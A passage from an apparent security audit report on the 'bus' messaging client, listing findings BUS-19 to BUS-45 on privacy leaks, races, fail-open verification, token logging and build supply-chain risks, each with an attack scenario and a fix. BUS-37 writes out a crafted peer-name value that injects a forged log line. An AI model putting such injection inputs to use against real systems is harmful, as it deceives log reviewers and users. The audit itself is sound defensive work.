**Recommendation.** Add a CSP such as default-src 'self'; script-src 'self' 'sha256-&lt;hash of the theme script&gt;'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; connect-src 'self'; object-src 'none'; base-uri 'none'. Move the inline theme script to a file to avoid the hash.

#### BUS-19

**Escape closes ImportDialog without stopping the camera stream**

Severity: Low · Category: privacy

Locations: `cmd/bus/frontend/src/lib/ImportDialog.svelte:59`, `cmd/bus/frontend/src/lib/ImportDialog.svelte:92`, `cmd/bus/frontend/src/App.svelte:864`, `cmd/bus/frontend/src/App.svelte:788`

The camera MediaStream is stopped only in stopCamera(), which runs from handleClose, the Cancel Scan button or a successful scan. The component has no onDestroy cleanup. The global Escape handler calls closeAllDialogs(), which sets showImport=false and unmounts ImportDialog directly. The stream tracks stay live after the dialog is gone, so the camera stays on until the app exits.

**Attack scenario.** The user starts a QR scan, then presses Escape. The dialog disappears but the camera indicator stays lit and the webview keeps the video capture open for the rest of the session.

**Recommendation.** Add onDestroy(() => stopCamera()) (or a $effect cleanup) in ImportDialog so every unmount path releases the stream.

#### BUS-20

**Message previews go to OS notifications and clicks copy plaintext to clipboard, including in incognito**

Severity: Low · Category: privacy

Locations: `cmd/bus/messaging.go:157-163`, `cmd/bus/frontend/src/App.svelte:277-283`, `cmd/bus/frontend/src/App.svelte:455-458`, `cmd/bus/frontend/src/lib/ChatPanel.svelte:98-106`, `cmd/bus/frontend/src/lib/ChatPanel.svelte:257`, `cmd/bus/frontend/src/App.svelte:1482`

For a session that is not active, the bus sends the first 50 bytes of each received message as a notification body (messaging.go:157-163). The check is only on whether the session is active, not on incognito. The frontend shows it with `new Notification` when permission is granted (App.svelte:277-283) and requests that permission at startup (App.svelte:455-458). Where the webview exposes the Notification API, such as WebView2 on Windows, message text can enter OS notification history while incognito is on. The incognito dialog says new messages are not saved to disk. Any click on a message bubble copies the full text to the system clipboard (ChatPanel.svelte:98-106,257). The slice preview[:50] is by bytes.

**Attack scenario.** A local user or process reads the OS notification history or clipboard manager history and recovers message plaintext from sessions the user ran in incognito mode.

**Recommendation.** Default notifications to sender-only text ("New message") and suppress them in incognito. Copy to clipboard only through an explicit copy action, not on any bubble click. Truncate previews by runes.

#### BUS-21

**Relay and P2P bearer tokens are written to the log buffer, stderr and world-readable exported log files**

Severity: Low · Category: privacy

Locations: `cmd/bus/network.go:325`, `cmd/bus/network.go:462`, `cmd/bus/network.go:1107`, `cmd/bus/p2p.go:171-173`, `cmd/bus/p2p.go:471`, `cmd/bus/app.go:549-564` and 3 more

Bus writes full relay and P2P tokens into its in-memory log buffer through addLogEntry and emits them to the frontend. ExportLogsToFile creates the export file with os.Create (0666 minus umask). The entries do not reach stderr: addLogEntry (app.go:549-564) does not call slog. SetLogLevel only stores a setting, and the slog handler's Enabled follows the LevelDebug stderr handler. The lines for expired and removed tokens (relay.go:157, network.go:488) log tokens that can no longer be used.

**Attack scenario.** A user exports logs to attach to a bug report, or another local user reads the 0644 file. The reader takes a still-valid relay token, connects to the user's relay listener first and uses up the single-use token, which blocks the intended peer. In Auto-Accept mode, or as a known peer in Quick mode, the reader gets a session.

**Recommendation.** Log only a short token prefix. Create exported files with mode 0600 (os.OpenFile with O_CREATE|O_WRONLY|O_TRUNC and 0600). Make the capture level follow SetLogLevel.

#### BUS-22

**Any session closing deselects the session the user is viewing**

Severity: Low · Category: correctness

Locations: `cmd/bus/frontend/src/App.svelte:234`

The session-closed handler reloads sessions and then keeps the active ID only if the closed session is still present in the list. A closed session has just been removed, so the expression always yields null. Whenever any session closes (for example a remote peer disconnects session B), the active session A is cleared and the input disappears.

**Attack scenario.** A peer repeatedly connects and disconnects. Each disconnect kicks the user out of the conversation they are reading or typing in.

**Recommendation.** Clear activeSessionId only when it equals the closed session ID: activeSessionId.update((id) => (id === data ? null : id)).

#### BUS-23

**bus GenerateP2PToken non-listener path registers from a throwaway UDP socket; matches can never connect**

Severity: Low · Category: correctness

Locations: `cmd/bus/p2p.go:123-176`, `cmd/bus/p2p.go:337-371`, `cmd/bus/network.go:262-269`, `pkg/relayconn/broker/client.go:83-160`, `cmd/relay/internal/broker/broker.go:224-260`, `cmd/bus/frontend/src/lib/SignalingTokens.svelte:18-37` and 1 more

GenerateP2PToken falls back to client.Echo and client.Register when the running listener is not a *p2pListener or when staticToken is nil. Each call uses a throwaway DialUDP socket (client.go:84,124), and the broker records the REGISTER source address (broker.go:239,249). PEER_MATCHED therefore points dialers at a closed port. The 30 s refresh repeats this from new sockets. The UI reaches this path. The sidebar renders SignalingTokens with locked=true, which hides the mode buttons, so mode stays 'random' and peerArg is '' (SignalingTokens.svelte:34). On a static-mode p2p server, 'Generate peer token' registers a random token through the throwaway path. On a random-mode server it returns the existing listener token, and the RegisterToken branch is never reached. The network.go:262-269 block is dead code.

**Attack scenario.** A token generated through this path is shown in the sidebar as active, but dialers matched on it are sent to a closed port.

**Recommendation.** Require a running p2pListener for the broker address and use RegisterToken. Remove the dead auto-register block.

#### BUS-24

**Bus log handler labels INFO records as DEBUG and drops logger attributes, hiding library logs**

Severity: Low · Category: correctness

Locations: `cmd/bus/loghandler.go:76`, `cmd/bus/loghandler.go:120`, `cmd/bus/frontend/src/lib/stores.ts:68`, `cmd/bus/frontend/src/lib/LogViewer.svelte:90`

The level switch checks `r.Level >= slog.LevelDebug` before the default INFO case. slog.LevelInfo is 0 and LevelDebug is -4, so every INFO record is tagged "DEBUG". The log viewer filters with levelOrder.indexOf(e.level) >= min, and the default level is INFO, so all library INFO logs (session established, server started) are hidden. WithAttrs and WithGroup forward attributes only to the stderr handler, so the in-app buffer and exported logs lose attributes from derived loggers.

**Attack scenario.** Trigger is normal operation: a user investigating a connection opens the log viewer at the default INFO level and sees no kamune core INFO entries.

**Recommendation.** Order the cases Error, Warn, Info, then Debug for the remainder. Store pre-bound attrs in appLogHandler and append them in Handle.

#### BUS-25

**bus serverHandler admits sessions after StopServer; pending verification prompts are not cancelled**

Severity: Low · Category: correctness

Locations: `cmd/bus/network.go:880-950`, `cmd/bus/verifier.go:171-189`, `server.go:115-129`, `server.go:146-150`, `server.go:203-216`, `cmd/daemon/network.go:821-826` and 1 more

kamune Server.Close closes only the listener. Handshakes already in progress continue. bus awaitVerification has no cancel case, and bus serverHandler appends the session without checking a.server, so a peer accepted after StopServer becomes a live session. The window is bounded by the 30 s handshake deadline set in serve() (server.go:146-150), not by the 2-minute verificationTimeout. If the user accepts after that deadline, sendIntroduction fails and nothing is admitted. The new session is visible in the session list. The daemon rejects such sessions in serverHandler (d.server == nil). Its awaitVerification ctx is the daemon lifetime context, so it is not server-scoped either.

**Attack scenario.** Trigger: a remote peer starts a handshake shortly before the user clicks Stop Server. The verify dialog stays up. If the user accepts it, or in Auto-Accept mode, a new live session appears after the server was stopped, and StopServer did not close it.

**Recommendation.** In serverHandler, close the transport and return when a.server == nil. Give awaitVerification a server-scoped context that StopServer cancels, and reject pending requests on stop.

#### BUS-26

**Locked SignalingTokens "Generate peer token" ignores the selected peer and issues a random token**

Severity: Low · Category: correctness

Locations: `cmd/bus/frontend/src/lib/SignalingTokens.svelte:18`, `cmd/bus/frontend/src/lib/SignalingTokens.svelte:34`, `cmd/bus/frontend/src/lib/SignalingTokens.svelte:103`, `cmd/bus/frontend/src/lib/Sidebar.svelte:393`, `cmd/bus/p2p.go:60`, `cmd/bus/p2p.go:99`

In locked mode (server running with broker P2P) the random/static mode buttons are hidden and mode stays 'random'. The PeerSelect is shown and the button reads "Generate peer token" and requires a selected peer. handleGenerate computes peerArg = mode === 'static' ? selectedPeer : '', so it always passes '' and GenerateP2PToken creates a random token (p2p.go:60). The user believes the token is bound to the chosen peer.

**Attack scenario.** A user selects a contact and generates a "peer" token, expecting a static token the contact can derive independently. The contact derives the static token and registers it at the broker, while the server registered a different random token, so rendezvous fails. The token list shows mode "random" without a peer.

**Recommendation.** In locked mode pass selectedPeer when it is set (peerArg = (locked || mode === 'static') ? selectedPeer : '').

#### BUS-27

**Minor binding defects: RegisterP2PDialer returns a CancelFunc, GetShareInfo fails for p2p, misleading deriveP2PToken doc**

Severity: Low · Category: correctness

Locations: `cmd/bus/p2p.go:420-472`, `cmd/bus/network.go:1046-1122`, `cmd/bus/network.go:246-250`, `cmd/bus/p2p.go:208-212`, `cmd/bus/network.go:118`, `cmd/bus/network.go:186-199` and 1 more

RegisterP2PDialer is an exported method on the bound service, and it returns a context.CancelFunc, which cannot be serialized to JavaScript. A frontend call registers on the broker and then fails to return, so the cancel func is lost. The frontend does not call it today. GetShareInfo switches on serverTransportType, which is 'p2p' for P2P servers, so it returns 'unknown transport: p2p' and the share card fails. The deriveP2PToken comment says it 'prefers ECDH-derived tokens stored in a previous session', but it only computes the static token. In relay mode, StartServer ignores the deriveP2PToken error (network.go:118), so an invalid peer key falls back to random mode without telling the user. In P2P listener mode the p2pTokens entry gets an ExpiresAt 30 s ahead that is never refreshed, so the UI shows it as expired while the listener keeps refreshing.

**Attack scenario.** Trigger is benign. A user who picked a peer with a bad key for a relay server shares a random token without knowing it. P2P users cannot open the share card.

**Recommendation.** Unexport RegisterP2PDialer or return only the token. Handle 'p2p' in GetShareInfo. Return deriveP2PToken errors to the caller. Fix the comment. Update ExpiresAt from p2pListener.refreshLoop.

#### BUS-28

**Only ErrConnClosed triggers resumption; resets and other read errors end the session**

Severity: Low · Category: correctness

Locations: `cmd/bus/messaging.go:84-101`, `transport.go:81-93`, `conn.go:79-92`, `pkg/relayconn/conn.go:84-89`

ReceivePayload maps only io.EOF, net.ErrClosed and io.ErrClosedPipe to ErrConnClosed. On a direct TCP session, a reset (ECONNRESET) or a similar socket error is returned as 'reading payload: ...'. receiveMessages sends that to the default branch and ends the session without trying reconnectFn, even though the dialer stored resume parameters. Relay sessions are not affected: relayconn turns every read failure into io.EOF (pkg/relayconn/conn.go:84-89), which maps to ErrConnClosed.

**Attack scenario.** Trigger is benign. A NAT gateway drops state and the peer replies with RST. The session ends and must be set up again from scratch, with a new verification, although resumption tokens are available.

**Recommendation.** Treat any transport read error that is not an authentication, decrypt or sequence error as resumable. For example, check for net.Error and syscall reset errors, or add a core sentinel for network-level read failures.

#### BUS-29

**P2P relay fallback references undeclared useRelayPassword and always throws**

Severity: Low · Category: correctness

Locations: `cmd/bus/frontend/src/lib/P2PFallbackDialog.svelte:14`, `cmd/bus/frontend/src/lib/P2PFallbackDialog.svelte:59`, `cmd/bus/frontend/src/lib/P2PFallbackDialog.svelte:65`

useRelay() passes useRelayPassword.trim() to ConnectToServer, but the component only declares useRelayAddr, useRelayToken and loading. The compiled output keeps useRelayPassword as a free global, so the call throws ReferenceError and the user sees "Relay fallback failed: ReferenceError". The fallback also passes the bare host:port as relayAddr with no scheme, which the backend treats as plain ws, and offers no password field or TLS option.

**Attack scenario.** After a failed hole punch the user enters a relay address and clicks "Use relay". The connection is never attempted. No security impact beyond a broken fallback, but if fixed as-is it would connect over plaintext ws by default.

**Recommendation.** Declare a password state and input, add scheme selection (default wss or tls), and build relayAddr as scheme://host like App.svelte does. Enable checkJs or lang="ts" in Svelte components so svelte-check catches undeclared identifiers.

#### BUS-30

**bus multiListener lets Add race Close (leaked listener) and panics on concurrent Close**

Severity: Low · Category: concurrency

Locations: `cmd/bus/multilistener.go:25-53`, `cmd/bus/multilistener.go:64-80`, `cmd/bus/relay.go:482`, `cmd/bus/network.go:357-365`

bus multiListener.Add checks done with no lock, then appends and calls wg.Add. Close closes done, closes the listeners it sees under mu, then waits. An Add that passes the check just before Close runs appends a relay listener that Close never closes. That listener stays registered at the relay, and its Accept goroutine stays blocked until the relay or network drops the registration. wg.Add can also race wg.Wait. relayReconnectLoop (relay.go:482) calls Add without a.mu while StopServer closes ml under a.mu, so the race is reachable, but the window is narrow. The concurrent-Close panic is not reachable from bus callers, because all Close calls are serialized by a.mu. The daemon copy guards both paths with a closed flag under mu.

**Attack scenario.** Trigger: the relay listener dies and relayReconnectLoop re-registers at the moment the user stops the server. The new relay listener is added after Close and leaks: the relay keeps the registration and a goroutine stays blocked. A sandbox test that copied cmd/bus/multilistener.go hit the panic and the leak. The daemon copy passed the same tests.

**Recommendation.** Port the daemon version: hold mu across the closed check, the append and wg.Add, and guard close(m.done) with a closed flag under mu.

#### BUS-31

**bus reads and writes shared App fields without a.mu (incognito, relay config, p2pListener); race detector confirms**

Severity: Low · Category: concurrency

Locations: `cmd/bus/network.go:81`, `cmd/bus/network.go:98`, `cmd/bus/network.go:144-147`, `cmd/bus/network.go:177`, `cmd/bus/network.go:219`, `cmd/bus/network.go:262-263` and 9 more

SetIncognito writes a.incognito under a.mu, but the three verifiers, serverHandler, ConnectToServer, loadChatHistory, SendMessage and receiveMessages read it without the lock. In StartServer, a.relayAddr, a.relayPassword, a.relaySessionTTL, a.relayListeners and a.p2pListener are assigned without a.mu, and serverUseP2P and related fields are read without it at network.go:262, while GenerateRelayToken, GetShareInfo, serverHandler and the ListenAndServe goroutine read or write them under a.mu. The daemon reads incognito through isIncognito() and sets these fields under d.mu.

**Attack scenario.** Trigger: the user toggles incognito while a message arrives, or a relay session is accepted while StartServer is still assigning fields. Under the Go memory model these are data races. The receive goroutine can read the stale flag and write a message to disk after incognito was enabled.

**Recommendation.** Add an isIncognito() accessor under a.mu (or use atomic.Bool) and use it everywhere. Assign the relay and p2p fields in StartServer inside one a.mu critical section.

#### BUS-32

**bus StartServer leaks relay/p2p listeners and the reconnect goroutine when setup fails**

Severity: Low · Category: resource-leak

Locations: `cmd/bus/network.go:59-73`, `cmd/bus/network.go:141-149`, `cmd/bus/network.go:180-201`, `cmd/bus/network.go:228-233`, `server.go:356-365`, `cmd/daemon/network.go:237-244`

If kamune.NewServer fails, StartServer returns without undoing relay or p2p setup. a.relayListeners, a.relayTokens, the relay registration and the relayReconnectLoop goroutine stay in place, and so do a.p2pListener, which refreshes at the broker every 30 s, and the p2pTokens entry. a.relayListeners != nil then lets GenerateRelayToken add tokens to a listener set that no server accepts from. The reconnect loop's ctx (network.go:59) is never cancelled, because cleanupStart only sets startCancel to nil. In these modes NewServer fails only when storage.Attester() fails (server.go:362-365). The ml.Add failure branch at 138-140 cannot run, because ml is fresh and not closed. The daemon cleans up on the same error.

**Attack scenario.** Trigger: NewServer fails, for example when the identity cannot be loaded from storage. The relay keeps a registered slot for the user's token, the p2p punch socket stays bound and keeps refreshing at the broker every 30 s, and a later GenerateRelayToken adds tokens to a listener set that no server serves.

**Recommendation.** Close the listener on ml.Add failure, and on any error after listener creation close ml or the p2p listener, cancel p2p token contexts and reset the relay fields, as the daemon does.

#### BUS-33

**Each Share dialog open or Regenerate in relay mode opens a new relay listener and token**

Severity: Low · Category: resource-leak

Locations: `cmd/bus/frontend/src/App.svelte:347`, `cmd/bus/frontend/src/lib/ShareDialog.svelte:39`, `cmd/bus/network.go:1085`, `cmd/bus/network.go:1101`, `cmd/bus/network.go:1107`, `cmd/bus/relay.go:151`

GetShareInfo in relay mode calls listenRelayTracked on every call, which opens a new relay listener and registers a new token. Ctrl+E (show-share-card) and the ShareDialog Regenerate button both call it, and the previous token is never revoked. Each extra token keeps a relay connection and a local listener open until token_ttl expires (relay.go:151-158). It appears in the relay token list and can be removed manually. Every token is logged in full at INFO (network.go:1107).

**Attack scenario.** A user opens the share card several times while choosing how to send it. Several relay tokens are live at once, each consuming a relay session slot and a local listener. Anyone who obtains any of them (for example an older screenshot of the card) can connect to the server and reach the verification prompt.

**Recommendation.** Reuse an unconsumed share token while it is valid, and revoke the previous token when the user clicks Regenerate. Do not log full token values.

#### BUS-34

**Bus silently falls back to a random relay token when the selected peer key cannot be decoded**

Severity: Low · Category: input-validation

Locations: `cmd/bus/network.go:118-122`, `cmd/bus/network.go:435-444`, `cmd/bus/p2p.go:212-239`, `cmd/bus/frontend/src/lib/Sidebar.svelte:362-367`

StartServer (relay) and GenerateRelayToken call deriveP2PToken(peerPubB64) and discard the error. If the selected peer key fails to parse, or the identity lookup fails, the listener registers a relay-assigned random token although the user asked for a static token for that peer. No error is returned. The sidebar shows a 'random' badge and no peer name. The peer, who dials with its derived static token, never matches. ConnectToServer returns invalid_peer_key for the same error (network.go:614-618).

**Attack scenario.** Trigger: the user picks a peer with a corrupted stored key, or the store fails. The listener registers a random token and the sidebar shows it next to that peer's name. The peer dials with the static token derived on its side and never matches, and the user gets no error.

**Recommendation.** Return the deriveP2PToken error from StartServer and GenerateRelayToken when peerPubB64 is non-empty.

#### BUS-35

**echoFrom on the punch socket accepts the first datagram from any source as the STUN reply**

Severity: Low · Category: input-validation

Locations: `cmd/bus/broker.go:214-233`, `cmd/daemon/broker.go:154-173`, `cmd/bus/p2plistener.go:82`, `cmd/daemon/p2plistener.go:68`

echoFrom writes STUN_ECHO from an unconnected ListenUDP socket and then calls conn.Read, which returns the first datagram from any address. There is no source check and no transaction ID. A stray or injected packet makes parseEchoResponse fail (aborting WaitMatch or newP2PListener) or yields a wrong claim address. The broker ignores the claimed IP:port and uses the observed source (cmd/relay/internal/broker/broker.go:288-293), so a spoofed reply cannot redirect the match; the impact is aborting setup. Client.Echo and echoSeparate use connected sockets, so the kernel filters their source.

**Attack scenario.** A host that can reach the punch socket's port during the 2 s echo window sends any datagram to it. The bus or daemon fails to start the P2P listener or dial with 'malformed echo response'.

**Recommendation.** Use ReadFromUDP in a loop and ignore packets whose source is not the broker address, as WaitMatch already does. Consider adding a request nonce to STUN_ECHO in a future protocol version.

#### BUS-36

**Imported connection URLs silently set Skip TLS verification and default relay scheme to plain ws**

Severity: Low · Category: input-validation

Locations: `cmd/bus/frontend/src/lib/ImportDialog.svelte:15`, `cmd/bus/frontend/src/App.svelte:375`, `cmd/bus/frontend/src/App.svelte:1597`, `cmd/bus/frontend/src/App.svelte:1288`, `cmd/bus/frontend/src/App.svelte:662`, `cmd/bus/relay.go:191`

Imported relay URLs (ImportDialog, and Ctrl+Shift+I clipboard import) copy insecure=true into connectRelayInsecure and default an absent scheme to ws. No warning is shown. For wss and tls the "Skip TLS verification" checkbox appears in the Connect dialog already checked (App.svelte:1288-1293). handleConnect then appends ?insecure=true to the relay address (App.svelte:662), which disables certificate checks in dialRelayFunc. The bus share URL never sets insecure (network.go:1116), so the flag only comes from third-party URLs. The share URL also carries no peer key to pin. The marginal risk is low, because an attacker who can alter the URL can also replace the host outright.

**Attack scenario.** An attacker who can alter a posted connection card or QR changes scheme to wss and appends insecure=true. A victim imports it, enters the relay password and connects. An on-path attacker with a self-signed certificate terminates TLS and runs the relay HPKE itself, learning the PSK and connection metadata.

**Recommendation.** Ignore insecure from imported URLs, or show an explicit warning that must be acknowledged. Default an absent scheme to wss. Include the peer public key or fingerprint in the share URL and check it against the responder's key after the handshake.

#### BUS-37

**Peer-controlled Name is unbounded and unsanitized in status, logs, prompts and the verify dialog; a long name hides Accept**

Severity: Low · Category: input-validation

Locations: `intro.go:87-91`, `cmd/bus/verifier.go:56-57`, `cmd/bus/verifier.go:118-119`, `cmd/bus/verifier.go:164`, `cmd/bus/verifier.go:206-212`, `cmd/bus/network.go:667` and 8 more

The remote Introduce Name has no length or character limit in the core apart from the 65535-byte frame limit (conn.go:156). Bus copies it into the status bar text, the log buffer, the verify prompt, the sidebar, the chat header and the session label, and on accept it is stored as the peer name. The local name is capped at 32 bytes (app.go:723), but remote names are not. ExportLogsToFile writes '%s [%s] %s\n' with no escaping, so a Name that contains a newline produces fake log lines in the exported file. Control, bidi override (U+202E, U+2066-2069) and confusable characters are passed through to the UI. VerifyResponse logs pending.peerID (the Name) through truncateSessionID, which treats it as a session ID. The verify dialog has no max-height or scroll, the overlay centers it, and html/body have overflow:hidden. A long name with spaces wraps into thousands of lines and pushes the fingerprint, warning and Accept/Reject buttons off-screen; only clicking the overlay margin (reject) remains.

**Attack scenario.** An unauthenticated client connects with Name = "x\n2026-10-03T10:00:00Z [INFO] [cmd/bus] Accepted peer: Bob" or 60 KB of words. The exported logs contain forged entries, the status bar and sidebar show the attacker's text, and the prompt becomes unusable for accepting. A right-to-left override can make the name render as a different string. Combined with the single-slot dialog, repeated connections keep the prompt filled with junk.

**Recommendation.** Bound Name length in the core (for example 64 bytes or runes) and reject longer values in receiveIntroduction. In the bus, strip control and bidi formatting characters, truncate with an ellipsis, escape newlines in exported logs, and add max-height with overflow:auto on dialog bodies so the action row is always visible.

#### BUS-38

**Verification mode is not range-checked; unknown values fall through to Auto-Accept**

Severity: Low · Category: input-validation

Locations: `cmd/bus/verifier.go:13-26`, `cmd/bus/app.go:625-641`, `cmd/bus/app.go:814-848`, `cmd/bus/main.go:37-46`, `cmd/bus/main.go:193`, `cmd/daemon/verifier.go:21-34`

getVerifier maps any mode other than Strict(0) or Quick(1) to createAutoAcceptVerifier, so the check fails open. SetVerificationMode, a Wails-bound method callable from the webview, stores VerificationMode(mode) without a range check and persists it. initFromStorage loads any integer from 'verification_mode' with strconv.Atoi and assigns it the same way. In those cases no radio item is checked and verifModeName shows 'Unknown', yet every connection is auto-accepted and stored with no prompt. In the menu handler, radioItems[prev] (main.go:43) panics with index out of range when the stored mode is outside 0..2 and SetVerificationMode returns false. The daemon validates the range in set_verification_mode and when loading, but keeps the same fail-open default branch.

**Attack scenario.** Trigger: a frontend bug, a future script injection into the webview that calls SetVerificationMode(7), or a settings value of 3 or -1 written by another tool with the passphrase. Verification silently becomes Auto-Accept, which the README says must not be used on untrusted networks. A MITM or impersonating peer is then accepted and stored without a fingerprint prompt while the UI shows no mode selected.

**Recommendation.** Reject out-of-range modes in SetVerificationMode and initFromStorage, and make the default branch of getVerifier return the Strict verifier (or an error) in both clients. Consider requiring a native confirm dialog to switch to Auto-Accept.

#### BUS-39

**Backend events for reconnect progress, relay pool exhaustion and failed history saves have no frontend listener**

Severity: Low · Category: ux-safety

Locations: `cmd/bus/messaging.go:62-63`, `cmd/bus/messaging.go:152-153`, `cmd/bus/messaging.go:282`, `cmd/bus/messaging.go:305`, `cmd/bus/relay.go:524`, `cmd/bus/app.go:1418` and 1 more

The backend emits history-save-failed (messaging.go:63,153), session-reconnecting (282), session-reconnected (305), relay-pool-exhausted (relay.go:524) and history-loaded (app.go:1418). The frontend never subscribes to them; the EventsOn block is App.svelte:229-397. A failed history save appears only as a WARN log line. During a resume the reconnect loop sleeps 151 s in total over 10 attempts, plus dial time, while the session looks normal in the UI.

**Attack scenario.** After a DB path change or unlock, which closes the live store (a known issue), every incoming message fails to persist. The user believes the conversation is recorded and relies on History later. The messages are gone, and the UI never said so.

**Recommendation.** Handle history-save-failed with a persistent warning on the session. Show reconnecting and reconnected state in the session header. Surface relay-pool-exhausted.

#### BUS-40

**Cancel during Connect only resets a UI flag; the dial, handshake and session creation continue in the background**

Severity: Low · Category: ux-safety

Locations: `cmd/bus/frontend/src/App.svelte:605-617`, `cmd/bus/frontend/src/lib/Sidebar.svelte:272-273`, `cmd/bus/network.go:496-509`, `cmd/bus/network.go:553-559`, `cmd/bus/network.go:623-626`, `cmd/bus/network.go:651` and 1 more

The sidebar shows a Cancel button while connectLoading is true. handleCancel only sets connectLoading = false. No backend cancel exists for ConnectToServer. The broker wait and relay dial use a.lifeCtx(), and Dial() has no context, so the call runs to completion. On success it appends the session, emits session-new (which focuses it), and starts the receive and keepalive loops.

**Attack scenario.** A user starts a connection to the wrong peer or relay, notices, and clicks Cancel. In Quick mode with a known key, or in Auto-Accept, the handshake completes silently a few seconds later. A live session to the unintended endpoint appears and takes focus, and the next typed message goes to it.

**Recommendation.** Add a CancelConnect binding backed by a per-attempt context. Pass it to WaitMatch, the relay dial funcs and the dialer, and drop the result if the attempt was cancelled. Until then, hide the Cancel button for connects.

#### BUS-41

**Generate random P2P token always returns the same token, contradicting the 'one-time and unlinkable' hint**

Severity: Low · Category: ux-safety

Locations: `cmd/bus/p2p.go:65-97`, `cmd/bus/p2p.go:179-206`, `cmd/bus/frontend/src/lib/Sidebar.svelte:393-397`, `cmd/bus/frontend/src/lib/SignalingTokens.svelte:18`, `cmd/bus/frontend/src/lib/SignalingTokens.svelte:34`, `cmd/bus/frontend/src/lib/SignalingTokens.svelte:115-146` and 1 more

GenerateP2PToken returns any existing non-static token for the same broker address unchanged (p2p.go:87-96). It does not refresh it, and refreshBrokerRegistration (p2p.go:185) is dead code. The only UI path is SignalingTokens mounted with `locked` (Sidebar.svelte:393-397). There the mode row is hidden and `mode` stays 'random' (SignalingTokens.svelte:18). handleGenerate then sends peerArg '' even when a peer is selected (:34). Every 'Generate peer token' click is a random-mode request. With a random-mode p2pListener it returns the listener's own token, which is re-registered every 30 s and never marked consumed. With a static listener, the first click registers a random token from the broker-client socket instead of the punch socket, and later clicks return that same token. The hint 'random tokens are one-time and unlinkable' does not hold for P2P tokens.

**Attack scenario.** A user clicks Generate twice to hand different random tokens to two contacts, so that the contacts cannot correlate each other or reuse the token. Both receive the identical token. Either contact, or anyone they forward it to, can match on the broker at any time while the server runs and learn the user's IP:port.

**Recommendation.** Issue a fresh broker token on each random-mode Generate, or state in the UI that the token is reused. Remove the dead refreshBrokerRegistration or call it. Track consumption, or fix the hint text for P2P.

#### BUS-42

**Bus README security and setup claims do not match the code (Strict mode, KAMUNE_DB_PASSPHRASE, encryption at rest, shortcuts, layout)**

Severity: Low · Category: spec-drift

Locations: `cmd/bus/README.md:3`, `cmd/bus/README.md:18`, `cmd/bus/README.md:22-49`, `cmd/bus/README.md:126-128`, `cmd/bus/README.md:136`, `cmd/bus/README.md:152` and 14 more

(1) Strict mode does not prompt on resumed sessions. Bus redials with DialWithResume (network.go:700), and handleResume checks only the stored peer key and token (server.go:242-319). (2) KAMUNE_DB_PASSPHRASE is ignored. Every bus OpenStorage call passes WithPassphraseHandler(a.passphraseHandler()), which replaces defaultPassphraseHandler (storage.go:67-72). (3) 'Database is encrypted at rest' (README:158, PassphraseDialog.svelte:85) is false after 'Use without password'. The empty passphrase is accepted and the KEK is HKDF('', stored salt). (4) Ctrl+Shift+L is not implemented. Ctrl+S stops a running server with no confirmation. Ctrl+W disconnects the active session. The Ctrl+Shift+W branch never fires, because e.key is 'W'. (5) Lines 3 and 18 say WebView2 for all platforms. The Linux package list is correct. (6) The architecture tree omits 8 of 13 non-test Go files.

**Attack scenario.** A user picks Strict mode for sensitive contacts expecting a prompt on every connection, or sets KAMUNE_DB_PASSPHRASE expecting bus to use it, and gets different behaviour. A user clicks "Use without password" because the README says the default is no passphrase and that the DB is encrypted at rest. A stolen laptop then yields the identity key, contacts and history with no brute force.

**Recommendation.** Document that resumed sessions skip verification in every mode, or add an option to require verification on resume in Strict mode. Honour KAMUNE_DB_PASSPHRASE in bus or remove the claim. State that encryption at rest requires a non-empty passphrase and add a warning to "Use without password". Fix the shortcut table, the platform text and the architecture tree.

#### BUS-43

**Linux release build installs GTK3 libs but Wails default needs GTK4; build inputs unverified**

Severity: Low · Category: build

Locations: `cmd/bus/scripts/Dockerfile.linux:7`, `cmd/bus/scripts/Dockerfile.linux:9`, `cmd/bus/scripts/build.sh:59-62`, `cmd/bus/scripts/build.sh:98-106`, `cmd/bus/build/linux/Taskfile.yml:24`, `cmd/bus/build/linux/Taskfile.yml:62` and 8 more

Wails v3.0.0-beta.23 links gtk4 and webkitgtk-6.0 unless built with the gtk3 tag. scripts/build.sh always builds the Linux target inside Dockerfile.linux, which installs only libgtk-3-dev and libwebkit2gtk-4.1-dev, and it passes no EXTRA_TAGS=gtk3. The Linux release build therefore fails on every host. nfpm.yaml declares GTK4 runtime dependencies, while README.md:61 tells users to install the GTK3 dev packages. The Dockerfile pipes the NodeSource setup script into bash. build.sh runs npm install, not npm ci. appimage/build.sh downloads and runs the 'continuous' linuxdeploy AppImage with no checksum. Its quoted glob in the mv line never expands, so under set -e the rename fails.

**Attack scenario.** A maintainer runs scripts/build.sh on a host without local GTK4 and gets no Linux artifact. A compromised or changed upstream (NodeSource script, npm registry resolution, linuxdeploy continuous release) executes code in the build environment with no integrity check.

**Recommendation.** Install libgtk-4-dev and libwebkitgtk-6.0-dev in Dockerfile.linux (or pass -tags gtk3 consistently and align nfpm deps and README). Use npm ci. Pin linuxdeploy to a release and verify a SHA-256. Install Node from a pinned, checksummed tarball. Remove the quotes around the glob in the mv line.

#### BUS-44

**Incognito 'pseudonym' is derived from the long-term public key and the same identity key is still sent**

Severity: Info · Category: privacy

Locations: `cmd/bus/network.go:81-87`, `cmd/bus/network.go:516-523`, `cmd/bus/app.go:613-617`, `cmd/bus/frontend/src/App.svelte:1479-1486`

Incognito replaces the display name with fingerprint.Pseudonym(pubKey) and skips persistence, as the dialog and DAEMON.md 902-912 state. It keeps the same long-term identity key, so peers who already know the key recognise the user. No doc claims otherwise. A user could still read the dialog as offering unlinkability. Adding one line to the dialog saying the identity key and fingerprint do not change would close that gap. The deterministic pseudonym leaks nothing beyond the public key that is already sent.

**Recommendation.** State in the incognito dialog that the identity key and fingerprint are unchanged. Or offer an ephemeral identity key for incognito sessions and use a random name rather than one derived from the key.

#### BUS-45

**Bus always captures DEBUG logs to stderr and the log buffer; the log-level setting changes nothing in the backend**

Severity: Info · Category: correctness

Locations: `cmd/bus/app.go:1269`, `cmd/bus/app.go:1220`, `cmd/bus/app.go:549`, `cmd/bus/messaging.go:167`, `cmd/bus/messaging.go:205`, `cmd/bus/loghandler.go:81` and 2 more

